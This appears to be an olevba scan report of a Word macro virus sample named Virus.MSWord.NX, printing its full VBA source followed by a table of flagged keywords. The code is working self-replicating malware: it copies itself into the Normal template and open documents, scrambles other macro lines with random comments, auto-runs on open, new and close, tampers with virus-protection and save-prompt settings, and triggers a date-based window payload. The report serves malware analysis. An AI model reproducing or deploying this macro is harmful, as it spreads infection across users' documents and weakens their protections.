olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NX-8f2f14bef28e984db90ad394357e5c6ed4122cbf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NX-8f2f14bef28e984db90ad394357e5c6ed4122cbf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub A187() ''
'³Ριψ«¬ξ«ΞµΗ�Πο�Θφ°ΉΞίκΝ©ϋΚΣίΟέΕΝτθέΙΞΝ«Ί»ϋ
Dim doc1i As Boolean, doc2i As Boolean ''
'τΜαΩ®ΩΤχ±¬§³φ©¦»ΌχΛμ©©ΐ―ώΈ�©ΏκΉ
doc1i = True: doc2i = True ''
ID = "Private Sub A187() ''" ''
'ΪήΦώ¶νφµ
Set doc1 = NormalTemplate.VBProject.VBComponents(1): Set doc2 = ActiveDocument.VBProject.VBComponents(1) ''
Set h = VBE.ActiveVBProject.VBComponents(1) ''
'ΉώΜΠΟµξΉΖρΟ¨ΔΛ§ΈϋςΫή§ΞµΣΒΤξσΉγΦμχ§�ΘΡϊ―ΥθηθΗηύ²Υ¦ΰΒ®θύΫΖΟ¥γΒ
If doc1.CodeModule.Lines(1, 1) <> ID Then doc1i = False ''
If doc2.CodeModule.Lines(1, 1) <> ID Then doc2i = False ''
'�ΖΟςεωΝέ¨λ·Ώ¥λΌηέρ¬ύ�«ΩθΉίΓγΜΨΫΤη¦§κΊΥ―Α
scr = h.CodeModule.Lines(1, h.CodeModule.CountOfLines) ''
'γώ¶υ¶¶ΕσΦϋΌΐΫΤ³άΣ«ΝθρΨ―ωΗΛχ²άξ»Ζ¬ξς
If doc1i = False Then ''
doc1.CodeModule.AddFromString scr ''
End If ''
If doc2i = False Then ''
'―εμηψίΰσ�Δ©¥�Ό½³ΓέΔ¶¶ϊΙαΣΖιάΤήκνόώΡ¬Ψέώ΄Β§ΞΙΝ©――«έηπνΛ―Έψ
doc2.CodeModule.AddFromString scr ''
'σΏµΒΧβΔΦΛµΎΉθχνΏΙ°ΓψΥΘΕ°πΣΰύζ¶ΐη΄ΟΖΩΐτΝ΄μΗςύψ�ΰΑΡΒΔ®ΙΩΕΜ¦ήΑψ»ήώΰ
End If ''
For i = 1 To doc1.CodeModule.CountOfLines ''
lin = doc1.CodeModule.Lines(i, 1) ''
'κΦθπΩ®
com = "" ''
For t = 1 To (70 * Rnd) ''
'°ΏΓίΊΠ¥κΉ·ΩΦ²Μάώσμγ¬ΞΏ·ΐΒοφ�ΈΘΈκο®ΏζΉτιβ«όΑΊΡµ�ϊκρ½΄λΦθ
com = com + Chr(255 - (90 * Rnd)) ''
Next t ''
If Right(lin, 2) <> "''" Then ''
'Δ®ϊί³υγςω¥γΡξλωοΘ�νσ¬ΒμΔ®ΧτΟΔπκΓρεθΎ°ΑΘιΉ¶ύ―Σωΰ®ΉΦΗ«θΤΦϊβιΠ¦ή®ΤΖ
doc1.CodeModule.ReplaceLine i, "'" + com ''
End If ''
'Ν¶Γ�Τ§ΔΈΌόοάΉΉΑ°ΫΈκΉΤΜςΜΈ¶υΌξόΧ¦§ήΜΛΚΖ
Next i ''
For y = 1 To doc2.CodeModule.CountOfLines ''
lin = doc2.CodeModule.Lines(y, 1) ''
com = "" ''
For t = 1 To (70 * Rnd) ''
com = com + Chr(255 - (90 * Rnd)) ''
'Ϋψ§τς¬ΧόΉξΣΕ�¬ΈΡηάΰνΫΓΊΨ
Next t ''
'ρόΜΒΑαδ―ϋΥΡΕ³οδΎΣ
If Right(lin, 2) <> "''" Then ''
doc2.CodeModule.ReplaceLine y, "'" + com ''
End If ''
Next y ''
End Sub ''
'ΐ±³ρΩηλΛ»Β©Β»ύυ±ΥλΊΦΰ§Λύ±­ΡκΧ²®ΒΝΨΔρς­µχλιΰι΄
Private Sub Document_New(): A187: End Sub ''
Private Sub Document_Open(): A187: Options.VirusProtection = (Rnd): Options.SaveNormalPrompt = (Rnd): Application.EnableCancelKey = wdCancelDisabled: End Sub ''
'ΔΒυΈΞ΄ΤΣζά·¶½όχ�μριΑ¬�τΖΗύ³ΌΕφΩ±ϊ²Ρ»χµΛ―«³πΧΛνΤΙχώι�ϊ²»Κ
Private Sub Document_Close(): A187: P187: End Sub ''
Private Sub P187() ''
'κφ¨ξΡθµ�ΣΌηϋσηΛΎ�λ³Έ¦©ΰΩ±ξιθψΎΪΐ
If Day(Now) = 20 Then ''
Application.Caption = "Who am I?Where am I going?-187.PEACE" ''
'τσύΉΐυλώ»«υΘΨΐΕΌϊύβ�ΖΦΈΠ
Application.Height = 187 ''
'ώΛΘΞϊθΤΡΐ¬±ΫυΏΏΥί«έΐλµ�κμΧοµΈ¬ΰ»«®Ϋ°―λυ§π®Όδ΄βΥά�ΐ§λΗΌΩΤΤΓΥυΦΰ·λωµ
Application.Width = 187 ''
Application.Move 187, 187 ''
'­θµι»έΎ¬¶σ―ά΄υφΚ
MsgBox "187.PEACE", vbSystemModal, "Deo to Peace" ''
'λμγδξ²ψνσΰ΄Υ¬ΧέΞ¶ΏφψέΕΞλ¶χζχη³�ΛΗΛΛίΩ
Rem This Virus is dedicated to Peace(eirhnh) ''
'²ΗΊ
Rem Greetings to everyone int the scene ''
Rem Why? The 187 Family! ''
'ΉδέΥΖΤ²ξεβυδΞύ―ΕΑθΫΔζ©κΕτξΦΧΙΪϊρρ±Ξβϋή²πΰπΠκεκ¦πΒΗβ²»ηχΑ
End If ''
'ι
End Sub ''
Private Sub ShowVBCode(): End Sub ''
'ό¥κϊ
'Υλπ�μδεΑ·ζή½ρ
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
